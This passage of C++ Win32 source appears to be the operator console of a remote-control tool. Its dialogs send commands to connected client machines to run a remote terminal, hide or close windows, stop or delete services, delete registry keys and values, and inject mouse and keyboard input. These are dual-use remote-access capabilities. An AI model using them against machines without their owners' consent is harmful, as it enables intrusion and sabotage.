                pkg.arg1 = (uint32_t)cmd.size();
                
                size_t bodySize = sizeof(CommandPkg) - 1 + cmd.size();
                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                PkgHeader* header = (PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                
                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                pPkg->cmd = pkg.cmd;
                pPkg->arg1 = pkg.arg1;
                memcpy(pPkg->data, cmd.c_str(), cmd.size());
                
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
            }
            return (INT_PTR)TRUE;
        } else if (LOWORD(wParam) == IDCANCEL) {
            // 发送关闭命令
            SendSimpleCommand(clientId, CMD_TERMINAL_CLOSE);
            
            // 重置客户端的终端对话框句柄
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) {
                    g_Clients[clientId]->hTerminalDlg = NULL;
                }
            }
            
            RemoveWindowSubclass(GetDlgItem(hDlg, IDC_EDIT_TERM_OUT), TerminalOutEditProc, 0);
            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE: {
        uint32_t clientId = dlgToClientId[hDlg];
        SendSimpleCommand(clientId, CMD_TERMINAL_CLOSE);

        // 重置客户端的终端对话框句柄
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) {
                g_Clients[clientId]->hTerminalDlg = NULL;
            }
        }

        RemoveWindowSubclass(GetDlgItem(hDlg, IDC_EDIT_TERM_OUT), TerminalOutEditProc, 0);
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK WindowDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"窗口标题"; lvc.cx = 300; ListView_InsertColumn(hList, 0, &lvc);
        lvc.pszText = (LPWSTR)L"类名";     lvc.cx = 150; ListView_InsertColumn(hList, 1, &lvc);
        lvc.pszText = (LPWSTR)L"句柄";     lvc.cx = 100; ListView_InsertColumn(hList, 2, &lvc);
        
        // 自动刷新
        SendMessage(hDlg, WM_COMMAND, IDM_WINDOW_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_WINDOW), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_WINDOW && nm->code == NM_RCLICK) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_REFRESH, L"刷新列表");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_CLOSE, L"关闭窗口");
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_MAX, L"最大化");
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_MIN, L"最小化");
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_RESTORE, L"恢复窗口");
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_HIDE, L"隐藏窗口");
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_SHOW, L"显示窗口");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_COPY_TITLE, L"复制标题");
            AppendMenuW(hMenu, MF_STRING, IDM_WINDOW_COPY_HWND, L"复制句柄");

            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
            DestroyMenu(hMenu);
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        auto SendWinCtrl = [&](uint32_t action) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = index;
                if (ListView_GetItem(hList, &lvi)) {
                    uint64_t hwnd = (uint64_t)lvi.lParam;
                    CommandPkg pkg = { 0 };
                    pkg.cmd = CMD_WINDOW_CTRL;
                    pkg.arg1 = (uint32_t)(hwnd & 0xFFFFFFFF);
                    pkg.arg2 = action;
                    size_t bodySize = sizeof(CommandPkg);
                    std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                    PkgHeader* header = (PkgHeader*)buffer.data();
                    memcpy(header->flag, "FRMD26?", 7);
                    header->originLen = (int)bodySize;
                    header->totalLen = (int)buffer.size();
                    memcpy(buffer.data() + sizeof(PkgHeader), &pkg, bodySize);
                    std::lock_guard<std::mutex> lock(client->sendMutex);
                    send(client->socket, buffer.data(), (int)buffer.size(), 0);
                }
            }
        };

        if (LOWORD(wParam) == IDC_BTN_WINDOW_REFRESH || LOWORD(wParam) == IDM_WINDOW_REFRESH) {
            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_WINDOW_LIST;
            size_t bodySize = sizeof(CommandPkg);
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(PkgHeader), &pkg, bodySize);
            std::lock_guard<std::mutex> lock(client->sendMutex);
            send(client->socket, buffer.data(), (int)buffer.size(), 0);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_CLOSE || LOWORD(wParam) == IDM_WINDOW_CLOSE) {
            SendWinCtrl(1);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_MAX || LOWORD(wParam) == IDM_WINDOW_MAX) {
            SendWinCtrl(2);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_MIN || LOWORD(wParam) == IDM_WINDOW_MIN) {
            SendWinCtrl(3);
        } else if (LOWORD(wParam) == IDM_WINDOW_RESTORE) {
            SendWinCtrl(4);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_HIDE || LOWORD(wParam) == IDM_WINDOW_HIDE) {
            SendWinCtrl(5);
        } else if (LOWORD(wParam) == IDC_BTN_WINDOW_SHOW || LOWORD(wParam) == IDM_WINDOW_SHOW) {
            SendWinCtrl(6);
        } else if (LOWORD(wParam) == IDM_WINDOW_COPY_TITLE) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t szTitle[512];
                ListView_GetItemText(hList, index, 0, szTitle, 512);
                if (wcslen(szTitle) > 0) {
                    if (OpenClipboard(hDlg)) {
                        EmptyClipboard();
                        size_t size = (wcslen(szTitle) + 1) * sizeof(wchar_t);
                        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
                        if (hGlobal) {
                            void* p = GlobalLock(hGlobal);
                            memcpy(p, szTitle, size);
                            GlobalUnlock(hGlobal);
                            SetClipboardData(CF_UNICODETEXT, hGlobal);
                        }
                        CloseClipboard();
                    }
                }
            }
        } else if (LOWORD(wParam) == IDM_WINDOW_COPY_HWND) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_WINDOW);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t szHwnd[64];
                ListView_GetItemText(hList, index, 2, szHwnd, 64);
                if (wcslen(szHwnd) > 0) {
                    if (OpenClipboard(hDlg)) {
                        EmptyClipboard();
                        size_t size = (wcslen(szHwnd) + 1) * sizeof(wchar_t);
                        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
                        if (hGlobal) {
                            void* p = GlobalLock(hGlobal);
                            memcpy(p, szHwnd, size);
                            GlobalUnlock(hGlobal);
                            SetClipboardData(CF_UNICODETEXT, hGlobal);
                        }
                        CloseClipboard();
                    }
                }
            }
        } else if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK ServiceDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        HWND hList = GetDlgItem(hDlg, IDC_LIST_SERVICE);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"服务名称"; lvc.cx = 150; ListView_InsertColumn(hList, 0, &lvc);
        lvc.pszText = (LPWSTR)L"显示名称"; lvc.cx = 250; ListView_InsertColumn(hList, 1, &lvc);
        lvc.pszText = (LPWSTR)L"状态";     lvc.cx = 100; ListView_InsertColumn(hList, 2, &lvc);
        lvc.pszText = (LPWSTR)L"启动类型"; lvc.cx = 80;  ListView_InsertColumn(hList, 3, &lvc);
        lvc.pszText = (LPWSTR)L"二进制路径"; lvc.cx = 300; ListView_InsertColumn(hList, 4, &lvc);
        
        // 自动刷新
        SendMessage(hDlg, WM_COMMAND, IDC_BTN_SERVICE_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_SERVICE), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_SERVICE && nm->code == NM_RCLICK) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_REFRESH, L"刷新列表");
            AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
            AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_START, L"启动服务");
            AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_STOP, L"停止服务");
            AppendMenuW(hMenu, MF_STRING, IDC_BTN_SERVICE_DELETE, L"删除服务");
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
            DestroyMenu(hMenu);
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        auto SendServiceCtrl = [&](uint32_t action) {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_SERVICE);
            int index = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (index != -1) {
                wchar_t wName[256];
                ListView_GetItemText(hList, index, 0, wName, 256);
                std::string name = WideToUTF8(wName);
                
                CommandPkg pkg = { 0 };
                pkg.cmd = CMD_SERVICE_LIST;
                pkg.arg1 = action; // 1=start, 2=stop, 3=delete
                
                size_t bodySize = sizeof(CommandPkg) - 1 + name.size() + 1;
                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                PkgHeader* header = (PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                
                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                pPkg->cmd = pkg.cmd;
                pPkg->arg1 = pkg.arg1;
                memcpy(pPkg->data, name.c_str(), name.size() + 1);
                
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
            }
        };

        if (LOWORD(wParam) == IDC_BTN_SERVICE_REFRESH) {
            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_SERVICE_LIST;
            pkg.arg1 = 0; // Get list
            size_t bodySize = sizeof(CommandPkg);
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(PkgHeader), &pkg, bodySize);
            std::lock_guard<std::mutex> lock(client->sendMutex);
            send(client->socket, buffer.data(), (int)buffer.size(), 0);
        } else if (LOWORD(wParam) == IDC_BTN_SERVICE_START) {
            SendServiceCtrl(1);
        } else if (LOWORD(wParam) == IDC_BTN_SERVICE_STOP) {
            SendServiceCtrl(2);
        } else if (LOWORD(wParam) == IDC_BTN_SERVICE_DELETE) {
            SendServiceCtrl(3);
        } else if (LOWORD(wParam) == IDCANCEL) {
            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK RegistryDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    static std::map<HWND, HIMAGELIST> dlgToImageList;

    // Helper lambda to get registry path from tree item
    auto GetRegistryPath = [](HWND hTree, HTREEITEM hItem, uint32_t& rootIdx) -> std::wstring {
        std::vector<std::wstring> pathParts;
        HTREEITEM hTmp = hItem;
        bool isRegistryNode = false;

        while (hTmp) {
            wchar_t text[256];
            TVITEMW tvi = { 0 };
            tvi.mask = TVIF_TEXT | TVIF_PARAM | TVIF_HANDLE;
            tvi.hItem = hTmp;
            tvi.pszText = text;
            tvi.cchTextMax = 256;
            TreeView_GetItem(hTree, &tvi);
            
            HTREEITEM hParent = TreeView_GetParent(hTree, hTmp);
            if (hParent == NULL) break; // Should not happen if My Computer is root
            
            TVITEMW tviParent = { 0 };
            tviParent.mask = TVIF_PARAM;
            tviParent.hItem = hParent;
            TreeView_GetItem(hTree, &tviParent);

            if (tviParent.lParam == -1) {
                // hTmp is an HKEY root
                rootIdx = (uint32_t)tvi.lParam;
                isRegistryNode = true;
                break;
            } else {
                pathParts.push_back(text);
            }
            hTmp = hParent;
        }

        if (!isRegistryNode) return L"";

        std::wstring fullPath;
        for (int i = (int)pathParts.size() - 1; i >= 0; i--) {
            fullPath += pathParts[i];
            if (i > 0) fullPath += L"\\";
        }
        return fullPath;
    };

    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
        HWND hList = GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES);
        
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"名称"; lvc.cx = 150; ListView_InsertColumn(hList, 0, &lvc);
        lvc.pszText = (LPWSTR)L"类型"; lvc.cx = 100; ListView_InsertColumn(hList, 1, &lvc);
        lvc.pszText = (LPWSTR)L"数据"; lvc.cx = 300; ListView_InsertColumn(hList, 2, &lvc);

        // --- Icon Setup ---
        HIMAGELIST hImageList = ImageList_Create(16, 16, ILC_COLOR32 | ILC_MASK, 3, 0);
        HICON hIconComputer = (HICON)LoadImageW(NULL, L"e:\\github\\Formidable2026\\我的电脑图标.ico", IMAGE_ICON, 16, 16, LR_LOADFROMFILE);
        HICON hIconFolder = (HICON)LoadImageW(NULL, L"e:\\github\\Formidable2026\\文件夹图标.ico", IMAGE_ICON, 16, 16, LR_LOADFROMFILE);
        
        HICON hIconFile = NULL;
        ExtractIconExW(L"shell32.dll", 0, NULL, &hIconFile, 1);

        if (hIconComputer) ImageList_AddIcon(hImageList, hIconComputer); // 0
        else ImageList_AddIcon(hImageList, LoadIcon(NULL, IDI_APPLICATION)); // Fallback

        if (hIconFolder) ImageList_AddIcon(hImageList, hIconFolder);     // 1
        else {
            SHSTOCKICONINFO sii = { 0 };
            sii.cbSize = sizeof(sii);
            if (SUCCEEDED(SHGetStockIconInfo(SIID_FOLDER, SHGSI_ICON | SHGSI_SMALLICON, &sii)) && sii.hIcon) {
                ImageList_AddIcon(hImageList, sii.hIcon);
                DestroyIcon(sii.hIcon);
            } else {
                ImageList_AddIcon(hImageList, LoadIcon(NULL, IDI_APPLICATION));
            }
        }

        if (hIconFile) ImageList_AddIcon(hImageList, hIconFile);         // 2
        else ImageList_AddIcon(hImageList, LoadIcon(NULL, IDI_WINLOGO)); // Fallback

        if (hIconFile) DestroyIcon(hIconFile); // ImageList makes a copy

        TreeView_SetImageList(hTree, hImageList, TVSIL_NORMAL);
        dlgToImageList[hDlg] = hImageList;

        // --- Root Node "我的电脑" ---
        TVINSERTSTRUCTW tvis = { 0 };
        tvis.hParent = TVI_ROOT;
        tvis.hInsertAfter = TVI_LAST;
        tvis.item.mask = TVIF_TEXT | TVIF_PARAM | TVIF_CHILDREN | TVIF_IMAGE | TVIF_SELECTEDIMAGE;
        tvis.item.cChildren = 1; 
        tvis.item.pszText = (LPWSTR)L"我的电脑";
        tvis.item.lParam = -1; 
        tvis.item.iImage = 0; 
        tvis.item.iSelectedImage = 0;
        HTREEITEM hRoot = TreeView_InsertItem(hTree, &tvis);
        TreeView_Expand(hTree, hRoot, TVE_EXPAND);

        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        int treeWidth = 200;
        MoveWindow(GetDlgItem(hDlg, IDC_TREE_REGISTRY), 0, 0, treeWidth, rc.bottom, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_REGISTRY_VALUES), treeWidth, 0, rc.right - treeWidth, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR pnmh = (LPNMHDR)lParam;
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        if (pnmh->idFrom == IDC_TREE_REGISTRY) {
            if (pnmh->code == TVN_ITEMEXPANDINGW || pnmh->code == TVN_SELCHANGEDW) {
                HTREEITEM hItem = (pnmh->code == TVN_ITEMEXPANDINGW) ? 
                                 ((LPNMTREEVIEWW)lParam)->itemNew.hItem : 
                                 ((LPNMTREEVIEWW)lParam)->itemNew.hItem;
                
                if (pnmh->code == TVN_ITEMEXPANDINGW && ((LPNMTREEVIEWW)lParam)->action != TVE_EXPAND) break;
                
                TVITEMW tviCurrent = { 0 };
                tviCurrent.mask = TVIF_PARAM;
                tviCurrent.hItem = hItem;
                TreeView_GetItem(pnmh->hwndFrom, &tviCurrent);

                if (tviCurrent.lParam == -1) {
                    if (TreeView_GetChild(pnmh->hwndFrom, hItem) == NULL) {
                         const wchar_t* roots[] = { L"HKEY_CLASSES_ROOT", L"HKEY_CURRENT_USER", L"HKEY_LOCAL_MACHINE", L"HKEY_USERS", L"HKEY_CURRENT_CONFIG" };
                         for (int i = 0; i < 5; i++) {
                             TVINSERTSTRUCTW tvis = { 0 };
                             tvis.hParent = hItem;
                             tvis.hInsertAfter = TVI_LAST;
                             tvis.item.mask = TVIF_TEXT | TVIF_PARAM | TVIF_CHILDREN | TVIF_IMAGE | TVIF_SELECTEDIMAGE;
                             tvis.item.cChildren = 1;
                             tvis.item.pszText = (LPWSTR)roots[i];
                             tvis.item.lParam = i;
                             tvis.item.iImage = 1;
                             tvis.item.iSelectedImage = 1;
                             TreeView_InsertItem(pnmh->hwndFrom, &tvis);
                         }
                    }
                    return 0;
                }

                uint32_t rootIdx = 0;
                std::wstring fullPath = GetRegistryPath(pnmh->hwndFrom, hItem, rootIdx);
                // Note: GetRegistryPath returns empty string if invalid, but rootIdx might be 0. 
                // Need robust check. Assuming if it's not My Computer (checked above), it's valid path or HKEY.
                
                std::string utf8Path = WideToUTF8(fullPath);
                CommandPkg pkg = { 0 };
                pkg.cmd = CMD_REGISTRY_CTRL;
                pkg.arg1 = rootIdx;
                pkg.arg2 = 0; // List
                size_t bodySize = sizeof(CommandPkg) - 1 + utf8Path.size() + 1;
                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                PkgHeader* header = (PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                pPkg->cmd = pkg.cmd;
                pPkg->arg1 = pkg.arg1;
                pPkg->arg2 = pkg.arg2;
                memcpy(pPkg->data, utf8Path.c_str(), utf8Path.size() + 1);
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
            } else if (pnmh->code == NM_RCLICK) {
                POINT pt;
                GetCursorPos(&pt);
                POINT ptClient = pt;
                ScreenToClient(pnmh->hwndFrom, &ptClient);
                TVHITTESTINFO ht = { ptClient };
                TreeView_HitTest(pnmh->hwndFrom, &ht);
                if (ht.hItem) {
                    TreeView_SelectItem(pnmh->hwndFrom, ht.hItem);
                    
                    TVITEMW tvi = { 0 };
                    tvi.mask = TVIF_PARAM;
                    tvi.hItem = ht.hItem;
                    TreeView_GetItem(pnmh->hwndFrom, &tvi);
                    if (tvi.lParam == -1) return 0; // Cannot delete My Computer

                    HMENU hMenu = CreatePopupMenu();
                    AppendMenuW(hMenu, MF_STRING, 1001, L"删除该项");
                    int ret = TrackPopupMenu(hMenu, TPM_RETURNCMD | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                    DestroyMenu(hMenu);
                    if (ret == 1001) {
                        if (MessageBoxW(hDlg, L"确定要删除该注册表项及其所有子项吗？", L"确认", MB_YESNO | MB_ICONWARNING) == IDYES) {
                            uint32_t rootIdx = 0;
                            std::wstring fullPath = GetRegistryPath(pnmh->hwndFrom, ht.hItem, rootIdx);
                            std::string utf8Path = WideToUTF8(fullPath);
                            CommandPkg pkg = { 0 };
                            pkg.cmd = CMD_REGISTRY_CTRL;
                            pkg.arg1 = rootIdx;
                            pkg.arg2 = 1; // Delete Key
                            size_t bodySize = sizeof(CommandPkg) - 1 + utf8Path.size() + 1;
                            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                            PkgHeader* header = (PkgHeader*)buffer.data();
                            memcpy(header->flag, "FRMD26?", 7);
                            header->originLen = (int)bodySize;
                            header->totalLen = (int)buffer.size();
                            CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                            pPkg->cmd = pkg.cmd;
                            pPkg->arg1 = pkg.arg1;
                            pPkg->arg2 = pkg.arg2;
                            memcpy(pPkg->data, utf8Path.c_str(), utf8Path.size() + 1);
                            std::lock_guard<std::mutex> lock(client->sendMutex);
                            send(client->socket, buffer.data(), (int)buffer.size(), 0);
                        }
                    }
                }
            }
        } else if (pnmh->idFrom == IDC_LIST_REGISTRY_VALUES && pnmh->code == NM_RCLICK) {
            int idx = ListView_GetNextItem(pnmh->hwndFrom, -1, LVNI_SELECTED);
            if (idx != -1) {
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, 1002, L"删除数值");
                int ret = TrackPopupMenu(hMenu, TPM_RETURNCMD | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
                if (ret == 1002) {
                    wchar_t valName[256];
                    ListView_GetItemText(pnmh->hwndFrom, idx, 0, valName, 256);
                    std::wstring wValName = valName;
                    if (wValName == L"(默认)") wValName = L"";

                    HWND hTree = GetDlgItem(hDlg, IDC_TREE_REGISTRY);
                    HTREEITEM hItem = TreeView_GetSelection(hTree);
                    uint32_t rootIdx = 0;
                    std::wstring fullPath = GetRegistryPath(hTree, hItem, rootIdx);

                    std::string payload = WideToUTF8(fullPath) + "|" + WideToUTF8(wValName);
                    CommandPkg pkg = { 0 };
                    pkg.cmd = CMD_REGISTRY_CTRL;
                    pkg.arg1 = rootIdx;
                    pkg.arg2 = 2; // Delete Value
                    size_t bodySize = sizeof(CommandPkg) - 1 + payload.size() + 1;
                    std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                    PkgHeader* header = (PkgHeader*)buffer.data();
                    memcpy(header->flag, "FRMD26?", 7);
                    header->originLen = (int)bodySize;
                    header->totalLen = (int)buffer.size();
                    CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                    pPkg->cmd = pkg.cmd;
                    pPkg->arg1 = pkg.arg1;
                    pPkg->arg2 = pkg.arg2;
                    memcpy(pPkg->data, payload.c_str(), payload.size() + 1);
                    std::lock_guard<std::mutex> lock(client->sendMutex);
                    send(client->socket, buffer.data(), (int)buffer.size(), 0);
                }
            }
        }
        break;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDCANCEL) {
            if (dlgToImageList.count(hDlg)) {
                ImageList_Destroy(dlgToImageList[hDlg]);
                dlgToImageList.erase(hDlg);
            }
            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        break;
    case WM_CLOSE:
        if (dlgToImageList.count(hDlg)) {
            ImageList_Destroy(dlgToImageList[hDlg]);
            dlgToImageList.erase(hDlg);
        }
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

LRESULT CALLBACK DesktopScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    HWND hDlg = (HWND)dwRefData;
    uint32_t clientId = 0;
    // We need to find the clientId associated with hDlg
    // A simple way is to use GetWindowLongPtr(hDlg, DWLP_USER) or similar if we set it
    // But for now let's use a static map or similar if we can access it.
    // Actually, DesktopDlgProc already has access to dlgToClientId.
    // Let's pass the clientId in dwRefData instead of hDlg, and find hDlg from parent.
    uint32_t cid = (uint32_t)uIdSubclass; 
    
    std::shared_ptr<ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(cid)) client = g_Clients[cid];
    }

    if (client && client->isMonitoring) {
        auto SendRemoteControl = [&](uint32_t cmd, void* data, size_t size) {
            size_t bodySize = sizeof(CommandPkg) - 1 + size;
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
            pkg->cmd = cmd;
            pkg->arg1 = (uint32_t)size;
            memcpy(pkg->data, data, size);
            std::lock_guard<std::mutex> lockSend(client->sendMutex);
            send(client->socket, buffer.data(), (int)buffer.size(), 0);
        };

        switch (message) {
        case WM_MOUSEMOVE:
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_MOUSEWHEEL: {
            RemoteMouseEvent ev = { 0 };
            ev.msg = message;
            RECT rc;
            GetClientRect(hWnd, &rc);
            HBITMAP hBmp = (HBITMAP)SendMessage(hWnd, STM_GETIMAGE, IMAGE_BITMAP, 0);
            if (hBmp) {
                BITMAP bmp;
                GetObject(hBmp, sizeof(BITMAP), &bmp);
                ev.x = (short)LOWORD(lParam) * bmp.bmWidth / (rc.right == 0 ? 1 : rc.right);
                ev.y = (short)HIWORD(lParam) * bmp.bmHeight / (rc.bottom == 0 ? 1 : rc.bottom);
            }
            if (message == WM_MOUSEWHEEL) ev.data = (short)HIWORD(wParam);
            SendRemoteControl(CMD_MOUSE_EVENT, &ev, sizeof(RemoteMouseEvent));
            break;
        }
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
        case WM_SYSKEYUP: {
            RemoteKeyEvent ev = { 0 };
            ev.msg = message;
            ev.vk = (uint32_t)wParam;
            SendRemoteControl(CMD_KEY_EVENT, &ev, sizeof(RemoteKeyEvent));
            return 0;
        }
